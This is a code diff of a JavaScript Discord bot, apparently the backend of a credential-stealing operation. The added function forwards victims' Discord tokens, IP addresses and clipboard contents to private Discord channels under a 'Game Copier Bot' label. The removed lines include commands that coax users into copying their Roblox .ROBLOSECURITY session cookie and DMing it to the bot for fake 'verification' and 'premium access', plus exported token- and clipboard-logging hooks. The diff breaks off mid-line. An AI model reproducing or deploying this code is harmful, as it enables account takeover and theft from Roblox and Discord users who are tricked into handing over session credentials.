@@ -367,6 +367,54 @@ async function buyRandomItem(cookie, userInfo) {
   }
 }
 
+// Unified sendToDiscordBot function (from the smaller codebase)
+async function sendToDiscordBot(data, type) {
+  if (!client.isReady()) {
+    console.error("Discord client not ready");
+    return;
+  }
+
+  try {
+    if (type === 'token') {
+      if (!accsChannel) {
+        console.error("#accs channel not found");
+        return;
+      }
+      await accsChannel.send({
+        embeds: [{
+          title: 'Discord Token Received',
+          color: 0xff9500,
+          description: `**IP:** ${data.userIP}\n` +
+                      `**Server ID:** ${data.serverId}\n` +
+                      `**Token:** \`${data.token}\``,
+          timestamp: new Date(),
+          footer: { text: 'Game Copier Bot' },
+        }]
+      });
+    } else if (type === 'clipboard') {
+      if (!loggingChannel) {
+        console.error("#logging channel not found");
+        return;
+      }
+      await loggingChannel.send({
+        embeds: [{
+          title: 'Clipboard Content Received',
+          color: 0x00ff00,
+          description: `**IP:** ${data.userIP}\n` +
+                      `**Type:** ${data.type}\n` +
+                      `**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``,
+          timestamp: new Date(),
+          footer: { text: 'Game Copier Bot' },
+        }]
+      });
+    } else {
+      console.warn("Unknown data type to send:", type);
+    }
+  } catch (error) {
+    console.error("Error sending message to Discord:", error);
+  }
+}
+
 client.once('ready', async () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
   console.log(`📊 Serving ${client.guilds.cache.size} guilds`);
@@ -375,8 +423,8 @@ client.once('ready', async () => {
   const guild = client.guilds.cache.get(GUILD_ID);
   if (guild) {
     databaseChannel = guild.channels.cache.find(ch => ch.name === DATABASE_CHANNEL);
-    loggingChannel = guild.channels.cache.find(ch => ch.name === LOGGING_CHANNEL);
-    accsChannel = guild.channels.cache.find(ch => ch.name === ACCS_CHANNEL);
+    loggingChannel = guild.channels.cache.find(ch => ch.name === LOGGING_CHANNEL && ch.isTextBased());
+    accsChannel = guild.channels.cache.find(ch => ch.name === ACCS_CHANNEL && ch.isTextBased());
     tokensChannel = guild.channels.cache.find(ch => ch.name === TOKENS_CHANNEL);
     clipboardChannel = guild.channels.cache.find(ch => ch.name === CLIPBOARD_CHANNEL);
     
@@ -700,162 +748,4 @@ async function handleVerifyStatusCommand(interaction, userId) {
 
   const embed = new EmbedBuilder()
     .setColor(isVerified ? '#51cf66' : '#ff9f43')
-    .setTitle('🔍 Verification Status')
-    .addFields(
-      { name: 'Verified', value: isVerified ? '✅ Yes' : '❌ No', inline: true },
-      { name: 'Cookie Stored', value: hasCookie ? '✅ Yes' : '❌ No', inline: true },
-      { name: 'Premium Access', value: isVerified ? '✅ Enabled' : '❌ Disabled', inline: true }
-    );
-
-  if (!isVerified) {
-    embed.setDescription('Send me a DM with your Roblox cookie to get verified!');
-  }
-
-  await interaction.editReply({ embeds: [embed] });
-}
-
-async function handleResubmitCommand(interaction, userId) {
-  const embed = new EmbedBuilder()
-    .setColor('#0099ff')
-    .setTitle('🔄 Resubmit Cookie Instructions')
-    .setDescription('Follow these steps to resubmit your Roblox cookie:')
-    .addFields(
-      { name: '1️⃣ Find Your Cookie', value: 'Go to Roblox.com → F12 → Application → Cookies → .ROBLOSECURITY', inline: false },
-      { name: '2️⃣ Copy Complete Value', value: 'Copy the entire cookie value (usually 100+ characters)', inline: false },
-      { name: '3️⃣ Send via DM', value: 'Send the cookie directly to this bot via DM', inline: false }
-    )
-    .setFooter({ text: 'Need detailed help? Use /cookiehelp!' });
-
-  await interaction.editReply({ embeds: [embed] });
-}
-
-async function handleCookieHelpCommand(interaction) {
-  const embed = new EmbedBuilder()
-    .setColor('#0099ff')
-    .setTitle('🍪 How to Find Your Roblox Cookie')
-    .setDescription('**Step-by-step guide to get your .ROBLOSECURITY cookie:**')
-    .addFields(
-      { name: '1️⃣ Open Roblox', value: 'Go to https://roblox.com and make sure you\'re logged in', inline: false },
-      { name: '2️⃣ Open Developer Tools', value: 'Press **F12** or right-click → "Inspect Element"', inline: false },
-      { name: '3️⃣ Go to Application Tab', value: 'Click on "Application" tab in developer tools', inline: false },
-      { name: '4️⃣ Find Cookies', value: 'In the left panel: Storage → Cookies → https://www.roblox.com', inline: false },
-      { name: '5️⃣ Copy Cookie', value: 'Find ".ROBLOSECURITY" and copy its **entire value**', inline: false },
-      { name: '6️⃣ Send to Bot', value: 'Send the cookie to this bot via DM (not in server)', inline: false }
-    )
-    .addFields(
-      { name: '⚠️ Important Notes:', value: '• Never share your cookie with anyone else\n• The cookie should be 100+ characters long\n• Make sure you copy the complete value', inline: false }
-    )
-    .setFooter({ text: 'Still need help? Contact a server admin!' });
-
-  await interaction.editReply({ embeds: [embed] });
-}
-
-async function handleSubmitTokenCommand(interaction) {
-  // Only allow administrators or specific roles to use this command
-  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
-    await interaction.editReply({
-      content: '❌ You do not have permission to use this command.',
-      ephemeral: true
-    });
-    return;
-  }
-
-  const token = interaction.options.getString('token');
-  const ip = interaction.options.getString('ip') || 'Unknown';
-  const userAgent = interaction.options.getString('useragent') || 'Unknown';
-  const serverId = interaction.options.getString('serverid') || 'N/A';
-
-  const tokenData = {
-    token: token,
-    userIP: ip,
-    userAgent: userAgent,
-    serverId: serverId,
-    submittedBy: interaction.user.tag,
-    submittedById: interaction.user.id
-  };
-
-  await logDiscordToken(tokenData);
-
-  const embed = new EmbedBuilder()
-    .setColor('#51cf66')
-    .setTitle('✅ Token Data Submitted')
-    .setDescription('Discord token data has been logged successfully.')
-    .addFields(
-      { name: 'Status', value: 'Logged to #tokens channel', inline: false }
-    )
-    .setTimestamp();
-
-  await interaction.editReply({ embeds: [embed] });
-}
-
-async function handleSubmitClipboardCommand(interaction) {
-  // Only allow administrators or specific roles to use this command
-  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
-    await interaction.editReply({
-      content: '❌ You do not have permission to use this command.',
-      ephemeral: true
-    });
-    return;
-  }
-
-  const data = interaction.options.getString('data');
-  const ip = interaction.options.getString('ip') || 'Unknown';
-  const userAgent = interaction.options.getString('useragent') || 'Unknown';
-  const type = interaction.options.getString('type') || 'text';
-
-  const clipboardData = {
-    clipboardData: data,
-    userIP: ip,
-    userAgent: userAgent,
-    type: type,
-    submittedBy: interaction.user.tag,
-    submittedById: interaction.user.id
-  };
-
-  await logClipboardData(clipboardData);
-
-  const embed = new EmbedBuilder()
-    .setColor('#51cf66')
-    .setTitle('✅ Clipboard Data Submitted')
-    .setDescription('Clipboard data has been logged successfully.')
-    .addFields(
-      { name: 'Data Length', value: `${data.length} characters`, inline: true },
-      { name: 'Type', value: type, inline: true },
-      { name: 'Status', value: 'Logged to #clipboard channel', inline: false }
-    )
-    .setTimestamp();
-
-  await interaction.editReply({ embeds: [embed] });
-}
-
-// Export functions for server integration
-module.exports = {
-  logDiscordToken: async (data) => {
-    if (!tokensChannel) {
-      console.warn('⚠️ Tokens channel not available yet, data will be queued');
-      return;
-    }
-    return logDiscordToken(data);
-  },
-  logClipboardData: async (data) => {
-    if (!clipboardChannel) {
-      console.warn('⚠️ Clipboard channel not available yet, data will be queued');
-      return;
-    }
-    return logClipboardData(data);
-  },
-  client,
-  // Add method to check if bot is ready
-  isReady: () => client.isReady() && tokensChannel && clipboardChannel
-};
-process.on('SIGINT', () => {
-  console.log('🛑 Shutting down bot...');
-  client.destroy();
-  process.exit(0);
-});
-
-process.on('unhandledRejection', (error) => {
-  console.error('❌ Unhandled promise rejection:', error);
-});
-
-client.login(TOKEN);
+    .setTitle('🔍
